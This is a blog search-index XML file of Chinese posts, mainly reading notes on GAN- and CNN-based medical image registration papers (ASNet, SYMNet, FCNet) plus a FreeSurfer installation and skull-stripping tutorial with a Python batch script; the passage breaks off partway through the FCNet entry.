<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[【论文笔记】ASNet：基于生成对抗网络（GAN）的无监督单模和多模配准网络（范敬凡老师）]]></title>
    <url>%2F2020%2F07%2F27%2FASNet%2F</url>
    <content type="text"><![CDATA[本文是论文《Adversarial learning for mono- or multi-modal registration》的阅读笔记，是范敬凡老师的工作，是文章《Adversarial Similarity Network for Evaluating Image Alignment in Deep Learning based Registration》中工作的延续。关于后一篇文章，可以查看我的博客。 文章提出了一个基于GAN（生成对抗网络）的无监督配准模型，需要任何ground-truth形变场，也不需要指定相似性度量标准。 一、相关工作配准算法是来获取一个可以配准图像的空间变换，空间变换通常包括线性变换（平移、旋转、缩放、shearing）和非线性变换（体素到体素的关系）。配准问题可以表示为一个获取使得图像不相似性最小的形变场$\phi^ $，表示为下式：$$\phi^{}=\underset{\phi}{\operatorname{argmin}} \operatorname{dissim}\left(I_{M} \circ \phi, I_{F}\right)+\lambda \operatorname{reg}(\phi)$$其中，$I_M$和$I_F$分别表示浮动图像和固定图像；$I_M\circ\phi$表示根据形变场$\phi$变形后的浮动图像；图像的不相似性$dissim(I_M\circ\phi,I_F)$可以定义为SSD、CC/NCC、MI/NMI等；$reg(\phi)$是让形变场保持平滑的正则化项；$\lambda$是平衡权重。形变场的正则化可以通过高斯平滑，使用样条曲线或微分同胚来实现。 传统的医学图片配准方法通常是高维的数学优化，所以很耗时间。基于深度学习的有监督配准方法多聚焦于预测体素到体素的映射，即密集形变场（dense deformation fields），但是它们效果又被ground-truth形变场所限制。而无监督的配准方法旨在通过最大化图像之间的相似度来学习一个形变场，这里的图像相似度通常采用SSD（平方误差和）、CC（互相关）等，但是很难决定在不同的配准问题中采取哪种特定的相似性度量才会达到最好效果。无监督的方法另一个优点是没有有监督信息，所以节省了内存/显存，进一步同样的显存可以容纳更大的图像，使得大尺度的无标签图像的配准变成可能。 二、网络结构该模型实现了基于patch和基于图像的单模和多模3D图像的配准，单模图像选用的是脑部MR图像，多模选用的是骨盆的MR图像和CT图像。文章的贡献如下： 与传统的配准方法相比，该方法更鲁棒，更快，并且是端到端的； 与有监督配准方法相比，该方法不需要ground-truth形变场； 该方法可以自动学习图像之间的相似性度量，而不需要任何先验假设； 可以同时处理单模和多模配准问题。 文章提出的基于GAN的无监督配准模型包括一个配准网络（生成器）、一个判别器和空间变换网络。下图是网络的整体结构示意图。 1. 配准网络配准网络以两张图片作为输入，输出为和输入大小相同的形变场。配准网络R学习一个形变场，可以记为$R:(I_M,I_F)\rightarrow\phi$，配准网络通过最大化图像间的相似性来训练。 配准网络是基于U-Net的，在编码器阶段每个卷积的卷积核大小为$3\times3\times3$，并且后面跟着ReLU激活函数，然后使用$2\times2\times2$的最大池化层进行下采样。重复以上步骤两次就是编码器的结构。在解码器阶段，使用$2\times2\times2$的反卷积层进行上采样，每个反卷积层后也跟着一个ReLU激活函数。在编码器和解码器之间有跳跃连接。最终的形变场通过$1\times1\times1$的全卷积层（没有激活函数）来得到。 下图是配准网络的结构示意图。 下图是基于patch和基于全图像的配准中配准网络的具体结构： 2. 判别网络判别器是基于CNN的，判别器用来判别两张图片是否已经对齐，并在训练时将没对齐的信息传递给配准网络（通过反向传播更新配准网络的参数），即图像相似性由判别网络D来决定，判别网络判别两幅图像的相似性，并得到一个相似性概率$p\in[0,1]$，1表示相似，0表示不相似。 下图是判别器网络的结构示意图，如图所示，每个卷积层是0填充的，并且跟着ReLU激活函数，然后使用两个最大池化，最后使用全连接层加sigmoid激活函数来聚合所有的信息得到最终的输出。 3. 空间变换网络配准网络和判别器之间由空间变换网络（STN）连接，空间转换层可以根据形变场来对浮动图像做变形，使用三线性插值，该过程可表示为：$$\begin{aligned}I_{W}(x) &amp;=I_{M}(x+\phi(x)) \&amp; \approx \Sigma_{y \in \mathcal{N}(x+\phi(x))} I_{M}(y) \cdot \prod_{d \in{0,1,2}}\left(1-\left|x_{d}+\phi_{d}(x)-y_{d}\right|\right)\end{aligned}$$其中，$I_W$是浮动图像变形后的图像，$x$是体素位置，$y \in \mathcal{N}(x+\phi(x))$是位置$x+\phi(x)$的8体素的立方体邻居，$d$是图像空间的维度。空间转换层没有可训练的参数。 三、训练在训练时，按照以下顺序进行训练： 先喂给判别器一个参考图像（reference image）和一个固定图像（fixed image），参考图像就是和固定图像很相似的图像，来学习配准好的图像是什么样的； 喂给判别器一个根据预测的形变场变形后的浮动图像和一个固定图像，让判别器学习没有配准好的图像是什么样的； 喂给配准网络一个浮动图像和一个固定图像来学习能在判别器得到高分数的形变场。 当判别器不能区分正例样本和负例样本时，训练就收敛了。 1. 判别器的训练判别器有两个输入样例，一个是正例$P^+$，即一对配准好的图像；另一个是负例$P^-$，即一对没有配准好的图像，判别器的损失如下：$$\mathcal{L}_{D}(p)=\left{\begin{array}{ll}-\log (p), &amp; \quad c \in P^{+} \-\log (1-p), &amp; c \in P^{-}\end{array}\right.$$其中$p$是判别器的输出，即图像相似性概率；$c$表示输入样例，正例的值应该接近于1，而负例的值应该接近于0。 正例对于单模配准来说，理想的正例样本是两张完全相同的图像，但是这是不现实的，所以选用的参考图像是通过浮动图像和固定图像加权得到的，即：$$I_{R}=\alpha \cdot I_{M}+(1-\alpha) \cdot I_{F}, 0&lt;\alpha&lt;1$$在训练的初始阶段将$\alpha$设为0.2，以弱化相似性的需要，在后期将$\alpha$设为0.1以达到更高的精度。 对应多模配准来说，参考图像和浮动图像是来自同一模态的，而固定图像来自不同模态。使用同一模态下的少量MR和CT的图像对作为参考图像。 下图中的(a)、(b)分别表示单模和多模配准中的正例和负例样本。 2. 配准网络的训练配准网络中相似性损失定义为：$$\mathcal{L}{R}(p)=-\log (p), c \in P^{-}$$形变场的平滑性定义为：$$\mathcal{L}{\mathrm{reg}}(\phi)=\sum_{v \in \mathbb{R}^{3}} \nabla \phi^{2}(v)$$其中，$v$表示体素位置，此外，反折叠惩（anti-floding）罚项被用作正则项来惩罚较大的折叠（$\nabla\phi(v)+1&lt;0$）。配准网络的总损失如下：$$\mathcal{L}=\mathcal{L}{R}(p)+\lambda \cdot \mathcal{L}{\mathrm{reg}}(\phi)$$其中$\lambda$被设置为1000。 四、实验1. 具体实施该网络实现了基于patch 的和基于图像的配准两种方式，基于patch 的配准使用有重叠的大小为$68\times68\times68$的图像patch作为输入，输出大小为$28\times28\times28$的形变场向量patch。特意只预测中心的形变场，这是因为中心的信息被利用的最好，而边界信息也有所缺失，置信度不高。在获取输入patch的时候，以步长为28取patch块，也就是和输出大小相同，这样就可以保证输出的patch可以无重叠的拼成一个完整的形变场。 2. 实验设置单模和多模配准中使用的网络结构是相同的，使用的优化器都是Adam，学习率为$1e^{-4}$，每经过50K次迭代以0.5的权重进行衰变。基于patch的配准训练10个epoch，基于图像的训练20个epoch。 使用的baseline为LCC-demons和SyN模型，使用的相似性度量为SSD和CC。DL-GT表示使用由SyN产生的ground-truth形变场的深度学习配准模型，DL-SSD和DL-CC分别表示选用SSD和CC作为相似性度量的深度学习模型，DL-ASN是本文提出的模型。除非特别说明，所有的基于学习的方法都是基于patch的。选用的数据集有LPBA40、IBSR18、CUMC12和MGH10。 在单模配准中，在预处理阶段，对图像进行了线性配准（仿射配准），并全部重采样到$224\times224\times160$大小，训练集使用的是LPBA40的30张图像，LPBA40另外10张图像用作验证集，剩余的数据集图像全用作测试集，这样做是为了验证模型的通用性。评价指标为DSC（Dice相似性系数）和ASD（平均表面距离）。 多模配准时，使用的是22个前列腺癌患者的骨盆MR和CT图像，大小为$224\times192\times96$，使用的相似性度量为MI（互信息），这是因为SSD和CC在多模配种中不适用。在训练阶段，随机选择来自相同患者的10个图像对作为预备图像对，然后选择$15\times15$个来自CT和MR的图像对形成训练集，剩余的7个图像对作用测试集。 3. 实验结果下图展示了在不同数据集上的配准结果对比，文章所提出的模型在大多数数据集上都取得了最好的效果。 下图对比了基于patch的和基于图像配准方法的效果，可以发现基于patch的效果会更好一点，但是基于patch的配准在训练的时候每个epoch要比基于图像的配准花费的时间长，测试的时候基于patch的所花费的时间约是基于图像的10倍。 下图是MGH10数据集的配准结果，黄色区域是差异较为明显的区域。 下图是多模配准的结果，红色曲线是CT图像的ROI，绿色区域是MR图像中相关的ROI。 下图是在骨盆数据集上的多模配准结果，DSC的值越大越好，ASD的值越小越好。 下图是不同深度配准方法的负的雅克比行列式值的平均体素个数，可以发现本文的模型结果最低，效果最好。 下图是不同$\lambda$值对实验结果的影响。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[FreeSurfer的安装和使用（脑部图像去除头骨）教程]]></title>
    <url>%2F2020%2F07%2F24%2Ffreesurfer%2F</url>
    <content type="text"><![CDATA[FreeSurfer当前只支持Linux系统和Mac OS。我所使用的系统是Ubuntu 16 .0.4，FreeSurfer的安装耗时较小，但是在处理时耗时较长，可能需要数个小时，甚至一天，这个取决于机器性能，但是和GPU好像没太大关系。下面先给出总的安装步骤，然后单独给出详细的安装步骤。 首先给出几个我参考的文章： FreeSurfer-Introduction FSL/FreeSurfer安装教程 FreeSurfer使用手册 使用Voxelmorph配准IXI：数据预处理之颅骨去除及仿射对齐 其中第2个参考文章还安装了FSL，我现在也不是很清楚这个FSL是什么，据我的安装和使用结果来看，没必要单独安装，FreeSurfer里应该集成了FSL。 一、FreeSurfer总安装步骤12345678910wget https://surfer.nmr.mgh.harvard.edu/pub/dist/freesurfer/7.1.0/freesurfer-linux-centos6_x86_64-7.1.0.tar.gz #下载安装包tar -zxv -f freesurfer-linux-centos6_x86_64-7.1.0.tar.gz #解压缩# 注册，得license.txt，并将license.txt拷贝到./freesurfer目录下sudo chmod -R 777 ./freesurfer #改变freesurfer的权限vi ~/.bashrc# 在~/.bashrc文件中添加以下两行export FREESURFER_HOME=/home/syzhou/zuzhiang/freesurfersource $FREESURFER_HOME/SetUpFreeSurfer.shsource ~/.bashrcsudo apt-get install tcsh #安装tcsh，类似与bash，不安装运行的时候会报错 二、FreeSurfer安装分步介绍1. 下载FreeSurfer压缩包首先到官网下载相应的安装包，下载界面如下图所示，看好是下载Linux下的还是MacOS下的，虽然Linux下的安装包写的是CentOS，但是也支持Ubuntu。在红色框上面右击选择“复制下载连接”，然后在Linux系统下选择相应的路径，使用命令wget https://surfer.nmr.mgh.harvard.edu/pub/dist/freesurfer/7.1.0/freesurfer-linux-centos6_x86_64-7.1.0.tar.gz 下载安装包。 2. 安装虽然说是安装，其实只需要解压就可以了，使用命令tar -zxv -f freesurfer-linux-centos6_x86_64-7.1.0.tar.gz进行解压缩，如果你下载和我不是同一个版本，需要把压缩文件的文件名改一下，下同。解压后会在当前目录下生成一个名为freesurfer的文件夹。 3. 注册前往官方注册网站进行注册，过段时间后会收到一封电子邮件，附件中有名为license.txt的文件，下载下来，放到freesurfer文件夹下面。注册页面如下图所示。 4. 改变freesurfer文件夹权限使用命令sudo chmod -R 777 ./freesurfer更改文件夹权限，文件夹路径可能需要根据自己的做相应的调整。 5. 添加环境变量使用vi ~/.bashrc命令打开环境变量文件，在~/.bashrc文件中添加以下两行： 12export FREESURFER_HOME=/home/syzhou/zuzhiang/freesurfersource $FREESURFER_HOME/SetUpFreeSurfer.sh 并使用source ~/.bashrc命令使改变后的环境变量立即生效。然后会显示下图所示的信息。 6. 安装tcsh使用sudo apt-get install tcsh 命令安装tcsh，tcsh类似与bash，不安装的话，运行的时候会报错。 7. 测试在命令行中输入recon-al --help命令，如果显示帮助信息则说明安装成功，如果提示命令不存在或者只显示了路径信息则说明安装有问题，前者可以通过重新安装解决，后者应该是安装的第6步有问题。 三、FreeSurfer的使用这里主要是使用FreeSurfer来对脑部图像做头骨的去除。参考的文章是最开始提到的第四篇。 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 需要格外注意的是，每次进入终端使用FreeSurfer的时候需要输入命令： 12export FREESURFER_HOME=/home/syzhou/zuzhiang/freesurfersource $FREESURFER_HOME/SetUpFreeSurfer.sh 否则不能正常使用。 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 以下是使用FreeSurfer批量对图像进行去除头骨和仿射对齐等操作。其中path/a/b/c变量的值需要根据实际情况来改变。代码的第19行，如果图像文件的格式名不同，需要保留的字符串长度也不同，只需要文件名（不包括扩展名）即可。 cmd变量对应的命令中，a/b/c是环境变量配置命令，recon-all是颅骨去除的命令，mri_convert是进行格式转换，从mgz转到nii.gz，只是为了方便查看，mri_convert --apply_transform是进行仿射对齐操作。 123456789101112131415161718192021222324252627282930import osimport globpath = r"/home/syzhou/zuzhiang/Dataset/MGH10/Heads/"# 读取目录下的nii.gz文件images = glob.glob('/home/syzhou/zuzhiang/Dataset/MGH10/Heads/*.img')# 下面为freesurfer的环境配置命令a = "export FREESURFER_HOME=/home/syzhou/zuzhiang/freesurfer;"b = "source $FREESURFER_HOME/SetUpFreeSurfer.sh;"# 数据所在的目录c = "export SUBJECTS_DIR=/home/syzhou/zuzhiang/Dataset/MGH10/Heads;"#images=['/home/syzhou/zuzhiang/Dataset/MGH10/Heads/1127.img']for image in images: # 将文件路径和文件名分离 (filepath, tempfilename) = os.path.split(image) # 将路径名和文件名分开 (tempfilename, extension) = os.path.splitext(tempfilename) #将文件名和扩展名分开，如果为.nii.gz，则认为扩展名是.gz # freesurfer环境配置、颅骨去除、未仿射对齐mpz转nii、仿射对齐、仿射对齐mpz转nii.gz格式 filename=tempfilename[:] #根据扩展名的不同，这里需要做更改，只保留文件名即可 print("file name: ",filename) cmd = a + b + c \ + "recon-all -i " + image + " -autorecon1 -subjid " + filename + "&amp;&amp;" \ + "mri_convert " + path + filename + "/mri/brainmask.mgz " + path + filename \ + "/mri/brainmask.nii.gz;"\ + "mri_convert " + path + filename + "/mri/brainmask.mgz --apply_transform " + path + filename \ + "/mri/transforms/talairach.xfm -o " + path + filename + "/mri/brainmask_affine.mgz&amp;&amp;" \ + "mri_convert " + path + filename + "/mri/brainmask_affine.mgz " + path + filename \ + "/mri/brainmask_affine.nii.gz;" #print("cmd:\n",cmd) os.system(cmd) 为了更直观的看清楚cmd对应的指令，下面列出了当图像文件为1127.img时，cmd对应的内容，为了方便查看我加入了换行。 12345678910111213 export FREESURFER_HOME=/home/syzhou/zuzhiang/freesurfer; source $FREESURFER_HOME/SetUpFreeSurfer.sh; export SUBJECTS_DIR=/home/syzhou/zuzhiang/Dataset/MGH10/Heads; recon-all -i /home/syzhou/zuzhiang/Dataset/MGH10/Heads/1127.img -autorecon1 -subjid 1127&amp;&amp;mri_convert /home/syzhou/zuzhiang/Dataset/MGH10/Heads/1127/mri/brainmask.mgz /home/syzhou/zuzhiang/Dataset/MGH10/Heads/1127/mri/brainmask.nii.gz;mri_convert /home/syzhou/zuzhiang/Dataset/MGH10/Heads/1127/mri/brainmask.mgz --apply_transform /home/syzhou/zuzhiang/Dataset/MGH10/Heads/1127/mri/transforms/talairach.xfm -o /home/syzhou/zuzhiang/Dataset/MGH10/Heads/1127/mri/brainmask_affine.mgz&amp;&amp;mri_convert /home/syzhou/zuzhiang/Dataset/MGH10/Heads/1127/mri/brainmask_affine.mgz /home/syzhou/zuzhiang/Dataset/MGH10/Heads/1127/mri/brainmask_affine.nii.gz; 假设图像文件名为1127.img，则会在path对应的目录下生成一个以图像文件名命名的文件夹，里面保存处理的结果。下图就是g6.img对应的输出文件夹，里面的结构如下图所示，我们想要得到图片位于mri文件夹下。 mri文件夹下的文件如下图所示，其中brainmask.nii.gz是去除头骨后的图像，brainmask_affine.nii.gz是去除头骨且仿射对齐后的图像。 以下两图是处理前后的结果。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】SYMNet：基于CNN的快速对称微分同胚图像配准]]></title>
    <url>%2F2020%2F07%2F24%2FSYMNet%2F</url>
    <content type="text"><![CDATA[本文是论文《Fast Symmetric Diffeomorphic Image Registration with Convolutional Neural Networks》的阅读笔记。文章中有很多关于数学的描述，包括微分同胚、雅克比矩阵没有看懂，所以这部分内容有所残缺，建议读者直接阅读原文。 一、摘要由于之前的方法忽略了形变场的拓扑保持（topology preservation），并且形变场的平滑性只由全局平滑能量函数来约束，文章提出了一个名为SYMNet的无监督对称图像配准模型，该模型同时估计正向和反向的变换。 基于深度学习的配准方法中实质微分同胚性（substantial diffeomorphic properties）没有得到保证，即忽略了变换的拓扑保持和可逆性。模型的输出是一对微分同胚映射，用来将输入图像从两条测地线（geodesic path）映射到两幅图像的中间地带（middle ground）。微分同胚是可微的映射，并且存在可微的逆。 文章的主要贡献有： 提出了一个快速对称微分同胚图像配准方法来保证变换的拓扑保持和可逆性； 提出了新的方向一致性正则化，用负的Jacobian行列式来惩罚局部区域； 文章提出的范式和目标函数很容易在其他地方应用。 二、 可变形图像配准可变形图像（deformable image）配准的目标是建立起图像对之间的一个非线性关系，并且估计一个对齐两张图像的非线性转换。 可变形图像配准指的是将浮动图像变形以对齐到固定图像的过程，在该过程中两幅图像之间的相似性得到最大化。可变形图像配准是一个非线性配准过程用来建立浮动图像和固定图像之间的密集的体素级的非线性空间关系（dense voxel-wise non-linear spatial correspondence）。 用$F$和$M$分别表示固定图像和浮动图像，$\phi$来表示形变场，可变形图像配准过程可以表示为：$$\phi^{}=\underset{\phi}{\arg \min } \mathcal{L}{s i m}(F, M(\phi))+\mathcal{L}{r e g}(\phi)$$其中$\phi^{}$表示最优的形变场，$\mathcal{L}{sim}(\cdot,\cdot)$表示不相似性函数，$\mathcal{L}{seg}(\cdot)$表示平滑正则函数，$M(\phi)$表示变形后的浮动图像。 三、相关工作1. 微分同胚配准当前的配准方法通常是将位移场$u$参数化，形变场和位移场的关系为：$\phi(x)=x+u(x)$，其中$x$是恒定变换。这种方式虽然简单，但是对于大的变形来说可能对应的位移场并不存在，所以文章使用的是带有静态速度场的微分同胚变形模型。微分同胚是可微和可逆的，这就保证了平滑的一对一的映射，同时也保留了拓扑性。微分同胚形变场$\phi_t$可以由速度场来生成：$$\frac{d \phi_{t}}{d t}=\boldsymbol{v}^{t}\left(\phi^{t}\right)=\boldsymbol{v}^{t} \circ \phi^{t}$$其中$\circ$是复合运算符（composition operator），$v^t$表示时间$t$时刻的速度场，$\phi^0=Id$是恒等变换。 形变场可以表示为李代数的一员，并将其指数化以产生时间为1的变形$\phi^{(1)}$，即李群$\phi^{(1)}=\exp(v)$的一员。这表示指数化的流场使得映射是微分同胚和可逆的。给定初始形变场$\phi^{\left(1 / 2^{T}\right)}=x+v(x) / 2^{T}$，其中$T$表示总的时间，那么，$\phi^{(1/2)}$可以通过重现（recurrence）得到：$\phi^{\left(1 / 2^{t-1}\right)}=\phi^{\left(1 / 2^{t}\right)} \circ \phi^{\left(1 / 2^{t}\right)}$。 2. 基于学习的配准大多数有监督的配准方法采用ground truth形变场或分割图来指导学习过程。文献11（DIRNet）证明了在无监督配准中采用互相关作为相似度评价指标的有效性，文献5（VoxelMorph）通过$L_2$正则损失使得形变场平滑，文献9提出了一个概率微分同胚配准模型。 四、方法大多数基于学习的配准方法都是只从浮动图像映射到固定图像，而忽略了其逆映射（从固定图像映射到浮动图像）。让$X$，$Y$表示两个3D图像，可变形配准问题可以参数化为一个方程：$f_{\theta}(X, Y)=\left(\phi_{X Y}^{(1)}, \phi_{Y X}^{(1)}\right)$，其中$\theta$表示CNN的参数，$\phi_{X Y}^{(1)}=\phi_{X Y}(x, 1)$和$\phi_{Y X}^{(1)}=\phi_{Y X}(y, 1)$分别表示时间为1的从位置$x\in X$变形到$y\in Y$和从位置$y\in Y$变形到$x\in X$的微分同胚形变场。 文章提出分别学习两个时间为0.5的将$X$和$Y$变形到它们的平均大小$M$的形变场，模型收敛之后，时间为1的将$X$变形到$Y$和将$Y$变形到$X$的形变场就可以通过结合两个估计的时间为0.5的形变场而得到了。从$X$到$Y$的变形可以结构为：$\phi_{X Y}^{(1)}=\phi_{Y X}^{(-0.5)}\left(\phi_{X Y}^{(0.5)}(x)\right)$，从$Y$到$X$的变形可以结构为：$\phi_{XY}^{(1)}=\phi_{X Y}^{(-0.5)}\left(\phi_{Y X}^{(0.5)}(y)\right)$。因此方程$f_\theta$可以重写为：$f_{\theta}(X, Y)=\left(\phi_{Y X}^{(-0.5)}\left(\phi_{X Y}^{(0.5)}(x)\right), \phi_{X Y}^{(-0.5)}\left(\phi_{Y X}^{(0.5)}(y)\right)\right)$。 1. 对称微分同胚神经网络将方程$f_\theta$参数化为一个全卷积网络（FCN）、缩放层、squaring层和可微的空间变换器（STN），$\phi_{XY}^{(0.5)}$和$\phi_{YX}^{(0.5)}$使用缩放和squaring方法通过估计的速度场$v_{XY}$和$v_{YX}$来计算。FCN网络的结构类似于UNet，是一个5层的编码器-解码器结构，并且有跳跃连接。FCN以拼接的2通道的图像作为输入，以2个密集的（dense）、非线性的速度场$v_{XY}$和$v_{YX}$作为输出。在编码器的每一层，都有两个卷积核大小为$3\times3\times3$，步长分别为1和2的卷积层。在解码器的每一层采用步长为1的卷积核大小分别为$3\times3\times3$的卷积层和步长为1，卷积核为$2\times2\times2$的反卷积层。在解码器的最后两层是卷积核大小为$5\times5\times5$，步长为1的卷积层，并且跟着一个softsign激活函数（$\operatorname{softsign}(x)=\frac{x}{1+|x|}$），然后乘以常数$c$，用来产生两个速度场。乘以常数$c$是为了让速度场的范围在$[-c,c]$之间。实际操作时$c=100$。除了最后一个卷积层，FCN的每一个卷积层后面都跟着一个ReLU激活函数。 此外，使用空间变换器（STN）实现缩放层和squaring层，并用它对预测的速度场进行积分。 特别的给定时间步长$T$，初始化$\phi_{X Y}^{\left(1 / 2^{T}\right)}=x+\boldsymbol{v}{X Y}(x) / 2^{T}$和$\phi{YX}^{\left(1 / 2^{T}\right)}=x+\boldsymbol{v}_{YX}(x) / 2^{T}$，通过重现$\phi\left(1 / 2^{t-1}\right)=\phi^{(1 / t)} \circ \phi^{(1 / t)}$计算时间为0.5的形变场，直到$t=1$。 上图是模型的结构示意图，使用FCN来学习从$X，Y$到他们平均大小$M$的对称的时间为0.5的形变场，绿色的路径表示从$X$到$Y$的变换，黄色的路径表示从$Y$到$X$的变换，为了简介没有在图中画出$\mathcal{L}_{mag}$损失。 上图是FCN网络的结构示意图。 2. 对称相似性$\mathcal{L}{mean}$是对称平均形状相似性损失，$\mathcal{L}{sim}$是图像的相似性损失，有很多相似性度量，比如正则化的互相关NCC、均方误差MSE、距离的平方和SSD和互相关MI，这里选用的是NCC。让$I$和$J$表示两个输入图像，$\bar{I}(x)$和$\bar{J}(x)$分别是$I$和$J$在位置$x$的局部均值，局部均值通过以$x$为中心，大小为$w^3$，$w=7$的窗口来计算。NCC的定义如下：$$\begin{array}{l}N C C(I, J)=\sum_{x \in \Omega} \frac{\sum_{x_{i}}\left(I\left(x_{i}\right)-\bar{I}(x)\right)\left(J\left(x_{i}\right)-\bar{J}(x)\right)}{\sqrt{\sum_{x_{i}}\left(I\left(x_{i}\right)-\bar{I}(x)\right)^{2} \sum_{x_{i}}\left(J\left(x_{i}\right)-\bar{J}(x)\right)^{2}}}\end{array}$$其中$x_i$表示以$x$为中心的窗口内的位置。 $\mathcal{L}{sim}$的表示如下：$$\mathcal{L}{s i m}=\mathcal{L}{\text {mean}}+\mathcal{L}{\text {pair}}$$ $$\mathcal{L}{\text {mean}}=-N \operatorname{CC}\left(X\left(\phi{X Y}^{(0.5)}\right), Y\left(\phi_{Y X}^{(0.5)}\right)\right)$$ $$\mathcal{L}{\text {pair}}=-N C C\left(X\left(\phi{X Y}^{(1)}\right), Y\right)-N C C\left(Y\left(\phi_{Y X}^{(1)}\right), X\right)$$ 其中，$\mathcal{L}{mean}$用来衡量$X$和$Y$之间的不相似性，它们朝向平均大小$M$，$\mathcal{L}{pair}$衡量变形后的$X$和$Y$以及变形后的$Y$和$X$之间的不相似性。 3. 局部方向一致性全局正则化会使配准的精度降低，实际上全局正则化不能保证变换的拓扑保持，为了解决这个问题，提出了可选性雅可比行列式正则，以促进预测形变场的局部的方向一致性。可选性雅克比行列式正则损失为：$$\mathcal{L}{J d e t}=\frac{1}{N} \sum{p \in \Omega} \sigma\left(-\left|J_{\phi}(p)\right|\right)$$其中$N$表示$|J_\phi|$中元素的总数量；$\sigma(\cdot)$表示激活函数，这里用的是$\sigma(\cdot)=\max(0,\cdot)$，作用等同于ReLU；$|J_\phi(\cdot)|$表示在位置$p$处形变场$\phi$的雅克比行列式，其公式如下：$$J_{\phi}(p)=\left(\begin{array}{lll}\frac{\partial \phi_{x}(p)}{\partial x} &amp; \frac{\partial \phi_{x}(p)}{\partial y} &amp; \frac{\partial \phi_{x}(p)}{\partial z} \\frac{\partial \phi_{y}(p)}{\partial x} &amp; \frac{\partial \phi_{y}(p)}{\partial y} &amp; \frac{\partial \phi_{y}(p)}{\partial z} \\frac{\partial \phi_{z}(p)}{\partial x} &amp; \frac{\partial \phi_{z}(p)}{\partial y} &amp; \frac{\partial \phi_{z}(p)}{\partial z}\end{array}\right)$$但是并不是用可选性雅克比行列式正则损失代替原来的全局正则化，而是同时使用两者，以产生平滑且拓扑保持的变换。 接着，使用$\mathcal{L}{r e g}=\sum{p \in \Omega}\left(\left|\nabla \boldsymbol{v}{X Y}(p)\right|{2}^{2}+\left|\nabla \boldsymbol{v}{Y X}(p)\right|{2}^{2}\right)$来加强速度场的平滑，还通过幅值约束（magnitude constraint）$\mathcal{L}{m a g}=\frac{1}{N}\left(\left|\boldsymbol{v}{X Y}\right|{2}^{2}-\right.\left.\left|\boldsymbol{v}{Y X}\right|{2}^{2}\right)$来避免在路径上的偏移。所以总的损失函数为：$$\mathcal{L}(X, Y)=\mathcal{L}{s i m}+\lambda_{1} \mathcal{L}{J d e t}+\lambda{2} \mathcal{L}{r e g}+\lambda{3} \mathcal{L}_{m a g}$$ 五、实验在T1权重的脑部MRI数据集OASIS上做了基于图谱的配准实验，先将所有图像重采样到$256\times256\times256$大小，然后使用FreeSurfer做标准的预处理，包括运动校正、去除头骨、仿射空间归一化和皮质下结构分割。然后将图像裁剪为$144\times192\times160$大小。并将数据集划分为255、20、150分别作为训练集、验证集和测试集。随机从测试集选择5个MR图像作为图谱。 使用Dice相似系数（DSC）和雅克比行列式$|J_\phi|$作为衡量标准。DSC的取值范围是[0,1]，配准的越好对应的DSC值越大。雅克比行列式可以捕捉形变场的局部行为。选用ANTs包中的SyN、VoxelMorph（VM）和DIF-VM作为baseline。使用SGD优化器，学习率为$1e^{-4}$，动量为0.9，$\lambda_1=1000，\lambda_2=3，\lambda_4=0.1$。 上图是SYMNet与baseline模型的配准结果对比。 上图是平均DSC值（越高越好）和非正雅克比行列式的平均体素数（越低越好），可以发现SYMNet在DSC上取得最好的效果，在$|J_\phi|$上效果次优。 上表展示了局部方向一致性损失的影响。 上表对比了各种模型运行所需要的时间，可以发现SYMNet所需时间最短。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】FCNet：基于全卷积网络（FCN）的无监督配准模型]]></title>
    <url>%2F2020%2F07%2F21%2FFCNet%2F</url>
    <content type="text"><![CDATA[本文是论文《Unsupervised Deformable Image Registration with Fully Connected Generative Neural Network》的阅读笔记。 文章提出了一个基于FCN（全卷积网络）的无监督配准模型FCNet。尽管固定图像和浮动图像之间的变形场本质上是高维的，但文章假设这些变形场在实际中形成了低维流形。因此，在该模型中，神经网络由低维向量生成变形场的嵌入。这种低维流形形式避免了其他方法在图像配准过程中面临的与高维搜索空间相关的困难。该模型只需要少量训练集即可训练得到很好的效果。 图像配准的目标就是通过最大化图像之间相似性来计算固定图像和浮动图像之间的映射。在该模型中，输入是隐藏的低维向量，模型采用双线性插值而非B样条插值，这是第一个用来做无监督图像配准的基于学习的流型嵌入方法。文章的主要贡献有：1. 提出了一个采用低维向量作为输入的无监督网络；2. 通过嵌入生成了空间形变场。 模型使用FCN作为生成器，用来直接生成形变场，为了按顺序配准每个图像，采用一个低维向量（即隐藏向量（latent vector））作为输入，隐藏向量是通过自动编码器（AE）来获得的，自动编码器就是由编码器和解码器两部分构成的网络结构。由于使用自动编码器会增加时间，随机初始化输入向量。然后通过具有8个全连接层的FCN网络生成二维形变场${dx,dy}$。在优化时，不仅会更新网络参数，还会更新输入的隐藏向量。采用双线性插值或薄板样条插值来代替B样条插值。FCNet的结构示意图如下。 假设${I_i}{i=1}^n$表示一系列要配准的图像，使用一个参数为$\theta$的网络来计算形变场$f_\theta(t_i):R^t\rightarrow R^{N\times N}$，其中$N$是像素的数量，$d$是比$N$小的数，表示向量的维数，文章中使用的是$d=25$。可以将$f_\theta$称为嵌入方程，对于第$i$张图片，网络以$d$维隐藏向量$t_i$作为输入，以形变场$f_\theta(t_i)$作为输出。然后对浮动图像$I_i$进行变形得到配准后的图像$I(f_\theta(t_i))$。图像序列的损失函数如下：$$E{\text {data}}\left(\theta,\left{t_{i}\right}{i=1}^{n}\right)=\sum{i} \mid I_{i}-I_{\operatorname{mov}(i)}\left(f_{\theta}\left(t_{i}\right)\right)|$$其中$I_i$是固定图像，$I_{mov(i)}$是相应的浮动图像。下图表示在一个医学图像序列中固定图像和运动图像的选择，其中DF表示形变场。 为了对网络参数进行正则化，采用了网络权重平方和的平均值MSW进行正则化：$$M S W(\theta)=\frac{1}{N_{w}} \sum_{n=1}^{N_{w}} w_{n}^{2}$$其中$N_w$表示网络权重参数的个数，$w_n$表示向量表示$W$中参数矩阵的元素。优化问题可以写为以下公式：$$E\left(\theta,\left{t_{i}\right}{i=1}^{n}\right)=E{\text {data}}\left(\theta,\left{t_{i}\right}_{i=1}^{n}\right)+\lambda M S 